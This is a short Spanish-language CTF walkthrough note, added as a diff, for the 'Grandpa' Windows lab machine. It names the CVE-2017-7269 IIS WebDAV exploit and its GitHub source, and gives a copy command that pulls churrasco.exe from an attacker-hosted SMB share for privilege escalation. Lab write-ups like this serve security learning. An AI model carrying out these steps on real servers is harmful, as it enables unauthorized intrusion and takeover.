@@ -1,0 +1,47 @@
+maquina grandpa ------------------------- windows
+
+aprendizaje 
+
+IIS
+ASP
+Penetration Tester Level 2
+WebDav
+Web
+Vulnerability Assessment
+Outdated Software
+Reconnaissance
+Arbitrary File Upload
+Misconfiguration
+
+
+-------------------------------------
+
+esta maquina es identica al la granny, pero esta maquina no tiene los sitios publicos abiertos, por lo que
+tienes que utilizar un exploit, (que tambien se vio en la otra maquina) 
+
+el tema es que el exploit se aprobecha de PROPFIND que esta abierto publicamente 
+
+el exploit lo puedes encontrar en exploitdb pero la idea es utilizar uno que esta
+un poco mas maqueado que seria  
+
+
+CVE-2017-7269
+
+https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269
+
+dentro te pone como usarlo... 
+
+una vez lanzas el exploit entras y no eres autorizado, pero haces lo mismo que con granny 
+
+te mandas el churrasco.exe y lo ejecutas. 
+
+te lomandas con estos comandos 
+
+<en windows> 
+copy \\ip\nobrederecursocompartido\churrasco.exe nombreasignarle.exe
+
+
+
+y montas el recurso compartido en tu maquina y listo 
+
+
